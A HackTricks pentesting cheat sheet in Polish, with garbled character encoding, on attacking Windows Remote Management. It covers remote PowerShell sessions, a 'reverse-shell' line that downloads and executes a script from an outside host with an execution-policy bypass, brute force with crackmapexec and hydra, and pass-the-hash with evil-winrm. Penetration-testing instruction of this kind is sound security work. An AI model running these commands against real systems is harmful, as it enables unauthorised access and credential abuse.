# 5985,5986 - Pentesting WinRM

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## WinRM

[Windows Remote Management (WinRM)](https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426\(v=vs.85\).aspx) jest wyrÃ³Å¼niony jako **protokÃ³Å‚ od Microsoftu**, ktÃ³ry umoÅ¼liwia **zdalne zarzÄ…dzanie systemami Windows** przez HTTP(S), wykorzystujÄ…c SOAP w tym procesie. Jest zasadniczo zasilany przez WMI, prezentujÄ…c siÄ™ jako interfejs oparty na HTTP dla operacji WMI.

ObecnoÅ›Ä‡ WinRM na maszynie umoÅ¼liwia prostÄ… zdalnÄ… administracjÄ™ za pomocÄ… PowerShell, podobnie jak SSH dziaÅ‚a w innych systemach operacyjnych. Aby sprawdziÄ‡, czy WinRM dziaÅ‚a, zaleca siÄ™ sprawdzenie otwarcia konkretnych portÃ³w:

* **5985/tcp (HTTP)**
* **5986/tcp (HTTPS)**

Otwarty port z powyÅ¼szej listy oznacza, Å¼e WinRM zostaÅ‚o skonfigurowane, co pozwala na prÃ³by nawiÄ…zania zdalnej sesji.

### **Inicjowanie sesji WinRM**

Aby skonfigurowaÄ‡ PowerShell dla WinRM, uÅ¼ywa siÄ™ polecenia `Enable-PSRemoting` od Microsoftu, ktÃ³re przygotowuje komputer do akceptacji zdalnych poleceÅ„ PowerShell. PosiadajÄ…c podwyÅ¼szone uprawnienia PowerShell, moÅ¼na wykonaÄ‡ nastÄ™pujÄ…ce polecenia, aby wÅ‚Ä…czyÄ‡ tÄ™ funkcjonalnoÅ›Ä‡ i oznaczyÄ‡ dowolny host jako zaufany:
```powershell
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```
To podejÅ›cie polega na dodaniu symbolu wieloznacznego do konfiguracji `trustedhosts`, krok, ktÃ³ry wymaga ostroÅ¼nego rozwaÅ¼enia ze wzglÄ™du na jego implikacje. ZauwaÅ¼ono rÃ³wnieÅ¼, Å¼e zmiana typu sieci z "Public" na "Work" moÅ¼e byÄ‡ konieczna na maszynie atakujÄ…cego.

Ponadto, WinRM moÅ¼na **aktywowaÄ‡ zdalnie** za pomocÄ… polecenia `wmic`, co pokazano poniÅ¼ej:
```powershell
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
Ta metoda umoÅ¼liwia zdalne skonfigurowanie WinRM, zwiÄ™kszajÄ…c elastycznoÅ›Ä‡ w zarzÄ…dzaniu maszynami z systemem Windows zdalnie.

### SprawdÅº, czy skonfigurowano

Aby zweryfikowaÄ‡ konfiguracjÄ™ swojej maszyny atakujÄ…cej, uÅ¼ywa siÄ™ polecenia `Test-WSMan`, aby sprawdziÄ‡, czy cel ma prawidÅ‚owo skonfigurowany WinRM. WykonujÄ…c to polecenie, powinieneÅ› oczekiwaÄ‡ otrzymania szczegÃ³Å‚Ã³w dotyczÄ…cych wersji protokoÅ‚u i wsmid, co wskazuje na pomyÅ›lnÄ… konfiguracjÄ™. PoniÅ¼ej znajdujÄ… siÄ™ przykÅ‚ady ilustrujÄ…ce oczekiwany wynik dla skonfigurowanego celu w porÃ³wnaniu do nieskonfigurowanego:

* Dla celu, ktÃ³ry **jest** prawidÅ‚owo skonfigurowany, wynik bÄ™dzie wyglÄ…daÅ‚ podobnie do tego:
```bash
Test-WSMan <target-ip>
```
OdpowiedÅº powinna zawieraÄ‡ informacje o wersji protokoÅ‚u i wsmid, co oznacza, Å¼e WinRM jest poprawnie skonfigurowany.

![](<../.gitbook/assets/image (582).png>)

* Z drugiej strony, dla celu **nie** skonfigurowanego dla WinRM, skutkowaÅ‚oby to brakiem takich szczegÃ³Å‚owych informacji, co podkreÅ›la brak odpowiedniej konfiguracji WinRM.

![](<../.gitbook/assets/image (458).png>)

### Wykonaj polecenie

Aby zdalnie wykonaÄ‡ `ipconfig` na docelowej maszynie i zobaczyÄ‡ jego wynik, zrÃ³b:
```powershell
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
![](<../.gitbook/assets/image (151).png>)

MoÅ¼esz rÃ³wnieÅ¼ **wykonaÄ‡ polecenie z bieÅ¼Ä…cej konsoli PS za pomocÄ…** _**Invoke-Command**_. ZaÅ‚Ã³Å¼my, Å¼e masz lokalnie funkcjÄ™ o nazwie _**enumeration**_ i chcesz jÄ… **wykonaÄ‡ na zdalnym komputerze**, moÅ¼esz to zrobiÄ‡:
```powershell
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
### Wykonaj skrypt
```powershell
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### Uzyskaj reverse-shell
```powershell
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### Uzyskaj sesjÄ™ PS

Aby uzyskaÄ‡ interaktywnÄ… powÅ‚okÄ™ PowerShell, uÅ¼yj `Enter-PSSession`:
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../.gitbook/assets/image (1009).png>)

**Sesja bÄ™dzie dziaÅ‚aÄ‡ w nowym procesie (wsmprovhost) wewnÄ…trz "ofiary"**

### **Wymuszanie otwarcia WinRM**

Aby uÅ¼ywaÄ‡ PS Remoting i WinRM, ale komputer nie jest skonfigurowany, moÅ¼esz to wÅ‚Ä…czyÄ‡ za pomocÄ…:
```powershell
.\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
### Saving and Restoring sessions

To **nie zadziaÅ‚a**, jeÅ›li **jÄ™zyk** jest **ograniczony** na zdalnym komputerze.
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
W ramach tych sesji moÅ¼esz zaÅ‚adowaÄ‡ skrypty PS za pomocÄ… _Invoke-Command_
```powershell
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### BÅ‚Ä™dy

JeÅ›li napotkasz nastÄ™pujÄ…cy bÅ‚Ä…d:

`enter-pssession : Connecting to remote server 10.10.10.175 failed with the following error message : The WinRM client cannot process the request. If the authentication scheme is different from Kerberos, or if the client computer is not joined to a domain, then HTTPS transport must be used or the destination machine must be added to the TrustedHosts configuration setting. Use winrm.cmd to configure TrustedHosts. Note that computers in the TrustedHosts list might not be authenticated. You can get more information about that by running the following command: winrm help config. For more information, see the about_Remote_Troubleshooting Help topic.`

SprÃ³buj na kliencie (informacje [tutaj](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)):
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hackerami i Å‚owcami bÅ‚Ä™dÃ³w!

**WglÄ…d w Hacking**\
ZaangaÅ¼uj siÄ™ w treÅ›ci, ktÃ³re zagÅ‚Ä™biajÄ… siÄ™ w emocje i wyzwania zwiÄ…zane z hackingiem

**AktualnoÅ›ci Hackingowe w Czasie Rzeczywistym**\
BÄ…dÅº na bieÅ¼Ä…co z dynamicznym Å›wiatem hackingu dziÄ™ki aktualnym wiadomoÅ›ciom i spostrzeÅ¼eniom

**Najnowsze OgÅ‚oszenia**\
BÄ…dÅº informowany o najnowszych programach bug bounty oraz istotnych aktualizacjach platformy

**DoÅ‚Ä…cz do nas na** [**Discord**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hackerami juÅ¼ dziÅ›!

## PoÅ‚Ä…czenie WinRM w Linuxie

### Brute Force

UwaÅ¼aj, brute-forcing winrm moÅ¼e zablokowaÄ‡ uÅ¼ytkownikÃ³w.
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### UÅ¼ywanie evil-winrm
```ruby
gem install evil-winrm
```
Przeczytaj **dokumentacjÄ™** na jego githubie: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
Aby uÅ¼yÄ‡ evil-winrm do poÅ‚Ä…czenia z **adresami IPv6**, utwÃ³rz wpis w _**/etc/hosts**_, przypisujÄ…c **nazwÄ™ domeny** do adresu IPv6 i poÅ‚Ä…cz siÄ™ z tÄ… domenÄ….

### Pass the hash with evil-winrm
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
![](<../.gitbook/assets/image (680).png>)

### UÅ¼ywanie maszyny PS-docker
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### UÅ¼ywanie skryptu ruby

**Kod wyciÄ…gniÄ™ty stÄ…d:** [**https://alamot.github.io/winrm\_shell/**](https://alamot.github.io/winrm\_shell/)
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt
# https://alamot.github.io/winrm_shell/


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification => true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

* `port:5985 Microsoft-HTTPAPI`

## References

* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## HackTricks Automatyczne Komendy
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p â€˜MySuperSecr3tPass123!â€™

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.xyz/pentesting/pentesting-winrm

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hackerami i Å‚owcami bugÃ³w!

**WglÄ…d w Hacking**\
ZaangaÅ¼uj siÄ™ w treÅ›ci, ktÃ³re zagÅ‚Ä™biajÄ… siÄ™ w emocje i wyzwania zwiÄ…zane z hackingiem

**AktualnoÅ›ci Hackingowe w Czasie Rzeczywistym**\
BÄ…dÅº na bieÅ¼Ä…co z dynamicznym Å›wiatem hackingu dziÄ™ki aktualnym wiadomoÅ›ciom i wglÄ…dom

**Najnowsze OgÅ‚oszenia**\
BÄ…dÅº informowany o najnowszych programach bug bounty oraz istotnych aktualizacjach platformy

**DoÅ‚Ä…cz do nas na** [**Discord**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hackerami juÅ¼ dziÅ›!

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na githubie.

</details>
{% endhint %}
